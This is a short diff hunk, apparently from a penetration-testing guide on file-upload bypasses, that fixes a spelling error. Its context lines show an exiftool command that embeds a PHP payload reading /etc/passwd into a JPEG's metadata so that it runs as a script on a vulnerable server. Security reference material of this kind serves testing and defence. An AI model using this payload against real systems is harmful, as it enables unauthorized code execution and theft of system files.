@@ -77,7 +77,7 @@ Create a polyglot JPEG file containing malicious code within its metadata
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 ```
 
-This works if you can upload a php extension file. This works why you have a real image file (that bypass rescritions) but when you open the image it's executed as php script.
+This works if you can upload a php extension file. This works why you have a real image file (that bypass restrictions) but when you open the image it's executed as php script.
 
 ## Overriding server configuration
 
